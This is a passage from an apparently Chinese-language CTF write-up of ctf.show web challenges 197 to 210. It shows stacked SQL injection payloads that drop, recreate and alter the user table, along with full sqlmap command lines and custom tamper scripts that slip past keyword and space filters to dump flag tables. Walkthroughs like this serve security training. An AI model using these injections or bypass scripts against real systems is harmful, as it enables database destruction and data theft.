plaintext"><table><tr><td class="code"><pre><span class="line">POST:</span><br><span class="line">username=0;drop table ctfshow_user; create table ctfshow_user(`username` varchar(100),`pass` varchar(100)); insert ctfshow_user(`username`,`pass`) value(1,2);&amp;password=1</span><br></pre></td></tr></table></figure><p>非预期?: <code>username=0;show tables&amp;password=ctfshow_user</code>, 至于为什么能成功, 我不太清楚:</p><p><code>show tables;</code>会输出当前数据库内表名, 按理来说似乎不能过password的判断</p><h2 id="web198"><a class="header-anchor" href="#web198">¶</a>web198</h2><ul><li>描述: 用户名可以更长</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//<span class="doctag">TODO:</span>感觉少了个啥，奇怪,不会又双叒叕被一血了吧</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;/\*|\#|\-|\x23|\&#x27;|\&quot;|union|or|and|\x26|\x7c|file|into|select|update|set|create|drop/i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">  <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">  <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="number">0</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&quot;登陆成功 flag is <span class="subst">$flag</span>&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>create也没了, 如果不能写, 可以利用执行的命令将列中的数据调换比如<code>change</code>(其中要有一个新的列充当临时列), 添加<code>0;</code>后直接粘贴进用户名输入界面</p><p>然后用<code>username=0&amp;password=userAUTO</code>登录即可, 问就是可以通过web171得到用户名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alter table ctfshow_user change `username` `passw2` varchar(100);</span><br><span class="line">alter table ctfshow_user change `pass` `username` varchar(100);</span><br><span class="line">alter table ctfshow_user change `passw2` `pass` varchar(100);</span><br></pre></td></tr></table></figure><p>亦或者利用<code>insert</code>插入账号密码, 然后用<code>username=1&amp;password=2</code>登录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert ctfshow_user(`username`,`pass`) value(1,2)</span><br></pre></td></tr></table></figure><p>上面那个非预期解法也能用</p><h2 id="web199"><a class="header-anchor" href="#web199">¶</a>web199</h2><ul><li>描述: 继续</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//<span class="doctag">TODO:</span>感觉少了个啥，奇怪,不会又双叒叕被一血了吧</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;/\*|\#|\-|\x23|\&#x27;|\&quot;|union|or|and|\x26|\x7c|file|into|select|update|set|create|drop|\(/i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">  <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">  <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="number">0</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&quot;登陆成功 flag is <span class="subst">$flag</span>&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>web197的非预期也能用, 用web198的payload只需要将<code>varchar</code>改为<code>text</code>, 其余步骤相同</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alter table ctfshow_user change `username` `passw2` text;</span><br><span class="line">alter table ctfshow_user change `pass` `username` text;</span><br><span class="line">alter table ctfshow_user change `passw2` `pass` text;</span><br></pre></td></tr></table></figure><p>你可以在数据库管理工具比如<code>navicat</code>中修改列的类型, 默认是<code>varchar</code>, 下拉就可以找到其他类型用于替换, 还是需要多本地尝试</p><h2 id="web200"><a class="header-anchor" href="#web200">¶</a>web200</h2><ul><li>描述: 堆叠告一段落</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//<span class="doctag">TODO:</span>感觉少了个啥，奇怪,不会又双叒叕被一血了吧</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;/\*|\#|\-|\x23|\&#x27;|\&quot;|union|or|and|\x26|\x7c|file|into|select|update|set|create|drop|\(|\,/i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">  <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">  <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="number">0</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&quot;登陆成功 flag is <span class="subst">$flag</span>&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>web197的非预期可以用, web199可以用</p><h2 id="web201"><a class="header-anchor" href="#web201">¶</a>web201</h2><ul><li>描述: 开始系统练习sqlmap的使用</li></ul><p><a href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">sqlmap官方文档</a>, <a href="https://blog.csdn.net/2302_82189125/article/details/137142002">中文总结</a> ,<a href="https://www.cnblogs.com/Spec/p/11039206.html">大佬详细测试</a></p><p>你先别急, 提交和打开的界面不一样, 先测试过滤:</p><p>在api处随便传入id, 返回&quot;不使用sqlmap是没有灵魂的&quot;, 结合题目提示, 应该是要我们修改UA为sqlmap; 再次发包后返回&quot;打击盗版人人有责，你都不是从ctf.show来的&quot;, 那么这个就是referer检测了</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240812045431076.png" alt="image-20240812045431076"></p><p>绕过之后可以正常查询, 剩下的交给sqlmap</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 判断注入</span></span><br><span class="line">python3 .\sqlmap.py <span class="literal">-u</span> <span class="string">&quot;http://f12920c7-3414-4fbf-b2af-93df28bd0172.challenge.ctf.show/api/?id=1&quot;</span> <span class="literal">--user-agent</span>=sqlmap <span class="literal">--referer</span>=ctf.show</span><br><span class="line"><span class="comment"># 数据库</span></span><br><span class="line">python3 .\sqlmap.py <span class="literal">-u</span> <span class="string">&quot;http://f12920c7-3414-4fbf-b2af-93df28bd0172.challenge.ctf.show/api/?id=1&quot;</span> <span class="literal">--user-agent</span>=sqlmap <span class="literal">--referer</span>=ctf.show <span class="literal">--dbs</span></span><br><span class="line"><span class="comment"># 表</span></span><br><span class="line">python3 .\sqlmap.py <span class="literal">-u</span> <span class="string">&quot;http://f12920c7-3414-4fbf-b2af-93df28bd0172.challenge.ctf.show/api/?id=1&quot;</span> <span class="literal">--user-agent</span>=sqlmap <span class="literal">--referer</span>=ctf.show <span class="literal">-D</span> ctfshow_web <span class="literal">--tables</span></span><br><span class="line"><span class="comment"># 字段(可以跳过)</span></span><br><span class="line">python3 .\sqlmap.py <span class="literal">-u</span> <span class="string">&quot;http://f12920c7-3414-4fbf-b2af-93df28bd0172.challenge.ctf.show/api/?id=1&quot;</span> <span class="literal">--user-agent</span>=sqlmap <span class="literal">--referer</span>=ctf.show <span class="literal">-D</span> ctfshow_web <span class="literal">-T</span> ctfshow_user <span class="literal">--columns</span></span><br><span class="line"><span class="comment"># 值</span></span><br><span class="line">python3 .\sqlmap.py <span class="literal">-u</span> <span class="string">&quot;http://f12920c7-3414-4fbf-b2af-93df28bd0172.challenge.ctf.show/api/?id=1&quot;</span> <span class="literal">--user-agent</span>=sqlmap <span class="literal">--referer</span>=ctf.show <span class="literal">-D</span> ctfshow_web <span class="literal">-T</span> ctfshow_user <span class="literal">--dump</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240812050827876.png" alt="image-20240812050827876"></p><h2 id="web202"><a class="header-anchor" href="#web202">¶</a>web202</h2><ul><li>描述: 同上</li></ul><p>提示是用–batch改输入方式, 加上即可得到flag</p><p>变为POST方式发送, 别问为什么题目给的还是<code>$_GET</code></p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">python3 .\sqlmap.py <span class="literal">-u</span> <span class="string">&quot;http://97472135-302e-4f32-a7f3-d798ce3c0271.challenge.ctf.show/api/&quot;</span> <span class="literal">--data</span> <span class="string">&quot;id=1&quot;</span> <span class="literal">--user-agent</span>=sqlmap <span class="literal">--referer</span>=ctf.show <span class="literal">-D</span> ctfshow_web <span class="literal">-T</span> ctfshow_user <span class="literal">--dump</span></span><br></pre></td></tr></table></figure><h2 id="web203"><a class="header-anchor" href="#web203">¶</a>web203</h2><ul><li>描述: 同上</li></ul><p>在bp类工具中是不需要管Content-type的, 但是在sqlmap就需要加上, 原因可能是data本身是按照表单形式发送数据</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240812181633887.png" alt="image-20240812181633887"></p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">python3 .\sqlmap.py <span class="literal">-u</span> <span class="string">&quot;http://ab638a67-33f8-42c9-9323-11c2d3040f39.challenge.ctf.show/api/index.php&quot;</span> <span class="literal">--data</span> <span class="string">&quot;id=1&quot;</span> <span class="literal">--user-agent</span>=sqlmap <span class="literal">--referer</span>=ctf.show <span class="literal">--method</span>=PUT <span class="literal">--header</span>=content<span class="literal">-type</span>:text/plain <span class="literal">-D</span> ctfshow_web <span class="literal">-T</span> ctfshow_user <span class="literal">--dump</span></span><br></pre></td></tr></table></figure><h2 id="web204"><a class="header-anchor" href="#web204">¶</a>web204</h2><ul><li>描述: 同上</li></ul><p>新增了cookie, 打开网页后在控制台的<code>Application</code>的<code>Cookies</code>中, 先右键clear然后刷新界面即可得到cookie</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">python3 .\sqlmap.py <span class="literal">-u</span> <span class="string">&quot;http://752f281b-5cfc-435a-8400-abc6f24d4b92.challenge.ctf.show/api/index.php&quot;</span> <span class="literal">--data</span> <span class="string">&quot;id=1&quot;</span> <span class="literal">--user-agent</span>=sqlmap <span class="literal">--referer</span>=ctf.show <span class="literal">--method</span>=PUT <span class="literal">--header</span>=content<span class="literal">-type</span>:text/plain <span class="literal">--cookie</span>=<span class="string">&quot;PHPSESSID=5ktroj6g93e37kht5i4p5j6sd4;ctfshow=acbe58269fae75b2123e21cbf892ce7a&quot;</span> <span class="literal">-D</span> ctfshow_web <span class="literal">-T</span> ctfshow_user <span class="literal">--dump</span></span><br></pre></td></tr></table></figure><h2 id="web205"><a class="header-anchor" href="#web205">¶</a>web205</h2><ul><li>描述: 同上</li></ul><p>api调用需要鉴权, 抓包可以发现是先访问<code>api/getToken</code>获取Token再访问<code>api/index.php</code></p><p>利用<strong>–safe-url</strong>即可先访问鉴权链接再访问api, 记得添加<code>--safe-freq=1</code></p><p>在测试之后发现没有flag输出, 再次注入发现表名换了</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">python3 .\sqlmap.py <span class="literal">-u</span> <span class="string">&quot;http://2fb4d7c7-dbe1-4aa1-a983-a2c4aab2d9e7.challenge.ctf.show/api/index.php&quot;</span> <span class="literal">--data</span> <span class="string">&quot;id=1&quot;</span> <span class="literal">--user-agent</span>=sqlmap <span class="literal">--referer</span>=ctf.show <span class="literal">--method</span>=PUT <span class="literal">--header</span>=content<span class="literal">-type</span>:text/plain <span class="literal">--safe-url</span>=<span class="string">&quot;http://2fb4d7c7-dbe1-4aa1-a983-a2c4aab2d9e7.challenge.ctf.show/api/getToken.php&quot;</span> <span class="literal">--safe-freq</span>=<span class="number">1</span> <span class="literal">--cookie</span>=<span class="string">&quot;PHPSESSID=g8e78tvkumdeac399oq5q7ma1r&quot;</span> <span class="literal">-D</span> ctfshow_web <span class="literal">--tables</span></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">python3 .\sqlmap.py <span class="literal">-u</span> <span class="string">&quot;http://2fb4d7c7-dbe1-4aa1-a983-a2c4aab2d9e7.challenge.ctf.show/api/index.php&quot;</span> <span class="literal">--data</span> <span class="string">&quot;id=1&quot;</span> <span class="literal">--user-agent</span>=sqlmap <span class="literal">--referer</span>=ctf.show <span class="literal">--method</span>=PUT <span class="literal">--header</span>=content<span class="literal">-type</span>:text/plain <span class="literal">--safe-url</span>=<span class="string">&quot;http://2fb4d7c7-dbe1-4aa1-a983-a2c4aab2d9e7.challenge.ctf.show/api/getToken.php&quot;</span> <span class="literal">--safe-freq</span>=<span class="number">1</span> <span class="literal">--cookie</span>=<span class="string">&quot;PHPSESSID=g8e78tvkumdeac399oq5q7ma1r&quot;</span> <span class="literal">-D</span> ctfshow_web <span class="literal">-T</span> ctfshow_flax <span class="literal">--dump</span></span><br></pre></td></tr></table></figure><h2 id="web206"><a class="header-anchor" href="#web206">¶</a>web206</h2><ul><li>描述: 同上</li></ul><p>sql需要闭合, 你说的对, 但是据说会自己检测</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,pass from ctfshow_user where id = (&#x27;&quot;</span>.<span class="variable">$id</span>.<span class="string">&quot;&#x27;) limit 0,1;&quot;</span>;</span><br></pre></td></tr></table></figure><blockquote><p>记得更换Cookie</p></blockquote><p>给payload增加前缀和后缀就可以绕过闭合, 利用</p><ol><li><strong>–prefix</strong> 攻击载荷的前缀</li><li><strong>–suffix</strong> 攻击载荷的后缀</li></ol><p>表又换了</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">python3 .\sqlmap.py <span class="literal">-u</span> <span class="string">&quot;http://24a7ddb6-57f4-4f4a-8be5-cd8bd6bbe94f.challenge.ctf.show/api/index.php&quot;</span> <span class="literal">--data</span> <span class="string">&quot;id=1&quot;</span> <span class="literal">--user-agent</span>=sqlmap <span class="literal">--referer</span>=ctf.show <span class="literal">--method</span>=PUT <span class="literal">--header</span>=content<span class="literal">-type</span>:text/plain <span class="literal">--safe-url</span>=<span class="string">&quot;http://24a7ddb6-57f4-4f4a-8be5-cd8bd6bbe94f.challenge.ctf.show/api/getToken.php&quot;</span> <span class="literal">--safe-freq</span>=<span class="number">1</span> <span class="literal">--cookie</span>=<span class="string">&quot;PHPSESSID=i5h52knr3c0gcir1bk2p7na87v&quot;</span> <span class="literal">--prefix</span>=<span class="string">&quot;&#x27;)&quot;</span> <span class="literal">--suffix</span>=<span class="string">&quot;#&quot;</span> <span class="literal">-D</span> ctfshow_web <span class="literal">--tables</span></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">python3 .\sqlmap.py <span class="literal">-u</span> <span class="string">&quot;http://24a7ddb6-57f4-4f4a-8be5-cd8bd6bbe94f.challenge.ctf.show/api/index.php&quot;</span> <span class="literal">--data</span> <span class="string">&quot;id=1&quot;</span> <span class="literal">--user-agent</span>=sqlmap <span class="literal">--referer</span>=ctf.show <span class="literal">--method</span>=PUT <span class="literal">--header</span>=content<span class="literal">-type</span>:text/plain <span class="literal">--safe-url</span>=<span class="string">&quot;http://24a7ddb6-57f4-4f4a-8be5-cd8bd6bbe94f.challenge.ctf.show/api/getToken.php&quot;</span> <span class="literal">--safe-freq</span>=<span class="number">1</span> <span class="literal">--cookie</span>=<span class="string">&quot;PHPSESSID=i5h52knr3c0gcir1bk2p7na87v&quot;</span> <span class="literal">--prefix</span>=<span class="string">&quot;&#x27;)&quot;</span> <span class="literal">--suffix</span>=<span class="string">&quot;#&quot;</span> <span class="literal">-D</span> ctfshow_web <span class="literal">-T</span> ctfshow_flaxc <span class="literal">--dump</span></span><br></pre></td></tr></table></figure><h2 id="web207"><a class="header-anchor" href="#web207">¶</a>web207</h2><ul><li>描述: 同上</li></ul><p>–tamper 的初体验, 引入已经写好的绕过脚本, 这个在sqlmap的tamper文件夹下可以找到众多脚本</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//对传入的参数进行了过滤</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ /&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><a href="http://space2comment.py">space2comment.py</a> 打开看描述是将空格替换为<code>/**/</code></p><p>跑表名, 又换咯</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">python3 .\sqlmap.py <span class="literal">-u</span> <span class="string">&quot;http://a114a81d-81f0-4c1d-9587-4417766490b5.challenge.ctf.show/api/index.php&quot;</span> <span class="literal">--data</span> <span class="string">&quot;id=1&quot;</span> <span class="literal">--user-agent</span>=sqlmap <span class="literal">--referer</span>=ctf.show <span class="literal">--method</span>=PUT <span class="literal">--header</span>=content<span class="literal">-type</span>:text/plain <span class="literal">--safe-url</span>=<span class="string">&quot;http://a114a81d-81f0-4c1d-9587-4417766490b5.challenge.ctf.show/api/getToken.php&quot;</span> <span class="literal">--safe-freq</span>=<span class="number">1</span> <span class="literal">--cookie</span>=<span class="string">&quot;PHPSESSID=cg94j982tfcuo95gcqjpc7lttp&quot;</span> <span class="literal">--prefix</span>=<span class="string">&quot;&#x27;)&quot;</span> <span class="literal">--suffix</span>=<span class="string">&quot;#&quot;</span> <span class="literal">--tamper</span>=space2comment <span class="literal">-D</span> ctfshow_web <span class="literal">--tables</span></span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">python3 .\sqlmap.py <span class="literal">-u</span> <span class="string">&quot;http://a114a81d-81f0-4c1d-9587-4417766490b5.challenge.ctf.show/api/index.php&quot;</span> <span class="literal">--data</span> <span class="string">&quot;id=1&quot;</span> <span class="literal">--user-agent</span>=sqlmap <span class="literal">--referer</span>=ctf.show <span class="literal">--method</span>=PUT <span class="literal">--header</span>=content<span class="literal">-type</span>:text/plain <span class="literal">--safe-url</span>=<span class="string">&quot;http://a114a81d-81f0-4c1d-9587-4417766490b5.challenge.ctf.show/api/getToken.php&quot;</span> <span class="literal">--safe-freq</span>=<span class="number">1</span> <span class="literal">--cookie</span>=<span class="string">&quot;PHPSESSID=cg94j982tfcuo95gcqjpc7lttp&quot;</span> <span class="literal">--prefix</span>=<span class="string">&quot;&#x27;)&quot;</span> <span class="literal">--suffix</span>=<span class="string">&quot;#&quot;</span> <span class="literal">--tamper</span>=space2comment <span class="literal">-D</span> ctfshow_web <span class="literal">-T</span> ctfshow_flaxca <span class="literal">--dump</span></span><br></pre></td></tr></table></figure><h2 id="web208"><a class="header-anchor" href="#web208">¶</a>web208</h2><ul><li>描述: 同上</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//对传入的参数进行了过滤</span></span><br><span class="line"><span class="comment">// $id = str_replace(&#x27;select&#x27;, &#x27;&#x27;, $id);</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ /&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>将select替换为空, 利用双写绕过或者大小写绕过即可</p><p>但是你先别急, sqlmap默认的语句中select是大写的, 根本不用绕过, 直接执行即可, 记得换表</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">python3 .\sqlmap.py <span class="literal">-u</span> <span class="string">&quot;http://06e1020c-46ca-4bfa-bf50-404bcba0d0f8.challenge.ctf.show/api/index.php&quot;</span> <span class="literal">--data</span> <span class="string">&quot;id=1&quot;</span> <span class="literal">--user-agent</span>=sqlmap <span class="literal">--referer</span>=ctf.show <span class="literal">--method</span>=PUT <span class="literal">--header</span>=content<span class="literal">-type</span>:text/plain <span class="literal">--safe-url</span>=<span class="string">&quot;http://06e1020c-46ca-4bfa-bf50-404bcba0d0f8.challenge.ctf.show/api/getToken.php&quot;</span> <span class="literal">--safe-freq</span>=<span class="number">1</span> <span class="literal">--cookie</span>=<span class="string">&quot;PHPSESSID=osljp7s3hvh72lvml0h119jrmh&quot;</span> <span class="literal">--prefix</span>=<span class="string">&quot;&#x27;)&quot;</span> <span class="literal">--suffix</span>=<span class="string">&quot;#&quot;</span> <span class="literal">--tamper</span>=space2comment <span class="literal">-D</span> ctfshow_web <span class="literal">-T</span> ctfshow_flaxcac <span class="literal">--dump</span></span><br></pre></td></tr></table></figure><blockquote><p>upppercase.py是将所有查询语句换为大写的脚本, 也可以加进去</p></blockquote><p>你也可以自己写一个脚本塞进去, 记得是<code>SELECT</code>替换成<code>SESELECTLECT</code>, 可以用<code>-v [0-6]</code>查看调试信息, 数字为详细等级</p><p><a href="https://y4er.com/posts/sqlmap-tamper/">tamper脚本教学</a></p><h2 id="web209"><a class="header-anchor" href="#web209">¶</a>web209</h2><ul><li>描述: 同上</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,pass from ctfshow_user where id = &#x27;&quot;</span>.<span class="variable">$id</span>.<span class="string">&quot;&#x27; limit 0,1;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//对传入的参数进行了过滤</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">   <span class="comment">//TODO 未完工</span></span><br><span class="line">   <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ |\*|\=/&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>查询语句换回来了而且增加了过滤, 官方给的脚本不太好用,不如我们自己写</p><p>文件为<code>personal.py</code>, 可以利用一些现成的模板</p><p>在查看详细信息和本地测试的时候<code>=</code>不能直接替换为<code>like</code>, sqlmap会生成类似<code>1like1</code>这样的payload, 是不执行的, 但是<code>1 like 1</code>是可以执行的, 所以替换为<code>chr(0x0a) + 'like' + chr(0x0a)</code></p><p>官方给的简化版的:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.compat <span class="keyword">import</span> xrange</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    retVal = payload</span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        retVal = retVal.replace(<span class="string">&quot;COUNT(*)&quot;</span>, <span class="string">&quot;COUNT(id)&quot;</span>)</span><br><span class="line">        retVal = retVal.replace(<span class="string">&quot; &quot;</span>, <span class="built_in">chr</span>(<span class="number">0x09</span>))</span><br><span class="line">        retVal = retVal.replace(<span class="string">&quot;=&quot;</span>, <span class="built_in">chr</span>(<span class="number">0x09</span>) + <span class="string">&quot;like&quot;</span> + <span class="built_in">chr</span>(<span class="number">0x09</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure><p>文件放在tamper文件夹下即可执行命令</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">python3 .\sqlmap.py <span class="literal">-u</span> <span class="string">&quot;http://900ed93c-c2c6-4ada-8843-0cbd07fa0a2f.challenge.ctf.show/api/index.php&quot;</span> <span class="literal">--data</span> <span class="string">&quot;id=1&quot;</span> <span class="literal">--user-agent</span>=sqlmap <span class="literal">--referer</span>=ctf.show <span class="literal">--method</span>=PUT <span class="literal">--header</span>=content<span class="literal">-type</span>:text/plain <span class="literal">--safe-url</span>=<span class="string">&quot;http://900ed93c-c2c6-4ada-8843-0cbd07fa0a2f.challenge.ctf.show/api/getToken.php&quot;</span> <span class="literal">--safe-freq</span>=<span class="number">1</span> <span class="literal">--cookie</span>=<span class="string">&quot;PHPSESSID=4klk7a5hn71prtgqum1e50dmbu&quot;</span> <span class="literal">--tamper</span>=personal <span class="literal">-D</span> ctfshow_web <span class="literal">--tables</span></span><br></pre></td></tr></table></figure><p>换新的表ctfshow_flav</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">python3 .\sqlmap.py <span class="literal">-u</span> <span class="string">&quot;http://900ed93c-c2c6-4ada-8843-0cbd07fa0a2f.challenge.ctf.show/api/index.php&quot;</span> <span class="literal">--data</span> <span class="string">&quot;id=1&quot;</span> <span class="literal">--user-agent</span>=sqlmap <span class="literal">--referer</span>=ctf.show <span class="literal">--method</span>=PUT <span class="literal">--header</span>=content<span class="literal">-type</span>:text/plain <span class="literal">--safe-url</span>=<span class="string">&quot;http://900ed93c-c2c6-4ada-8843-0cbd07fa0a2f.challenge.ctf.show/api/getToken.php&quot;</span> <span class="literal">--safe-freq</span>=<span class="number">1</span> <span class="literal">--cookie</span>=<span class="string">&quot;PHPSESSID=6cp2hdmtd3tmtolmh0nium5jn1&quot;</span> <span class="literal">--tamper</span>=personal <span class="literal">-D</span> ctfshow_web <span class="literal">-T</span> ctfshow_flav <span class="literal">--dump</span></span><br></pre></td></tr></table></figure><p>下面这个大佬的脚本也可以, 如果前面测试太多都会出错, 因为sqlmap缓存会直接跳过前面判断的步骤, 这时候只能根据调试信息修改脚本, 这个是根据<code>space2comment.py</code>改的</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.compat <span class="keyword">import</span> xrange</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        retVal = <span class="string">&quot;&quot;</span></span><br><span class="line">        quote, doublequote, firstspace = <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="built_in">len</span>(payload)):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> firstspace:</span><br><span class="line">                <span class="keyword">if</span> payload[i].isspace():</span><br><span class="line">                    firstspace = <span class="literal">True</span></span><br><span class="line">                    retVal += <span class="built_in">chr</span>(<span class="number">0x0a</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&#x27;\&#x27;&#x27;</span>:</span><br><span class="line">                quote = <span class="keyword">not</span> quote</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&#x27;&quot;&#x27;</span>:</span><br><span class="line">                doublequote = <span class="keyword">not</span> doublequote</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&#x27;=&#x27;</span>:</span><br><span class="line">                retVal += <span class="built_in">chr</span>(<span class="number">0x0a</span>) + <span class="string">&#x27;like&#x27;</span> + <span class="built_in">chr</span>(<span class="number">0x0a</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&quot; &quot;</span> <span class="keyword">and</span> <span class="keyword">not</span> doublequote <span class="keyword">and</span> <span class="keyword">not</span> quote:</span><br><span class="line">                retVal += <span class="built_in">chr</span>(<span class="number">0x0a</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            retVal += payload[i]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure><h2 id="web210"><a class="header-anchor" href="#web210">¶</a>web210</h2><ul><li>描述: 同上</li></ul><p>还是利用tamper</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//对查询字符进行解密</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">decode</span>(<span class="params"><span class="variable">$id</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$id</span>))));</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>没过滤, 那就直接干就完了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.compat <span class="keyword">import</span> xrange</span><br><span class="line"><span class="keyword">from</span> 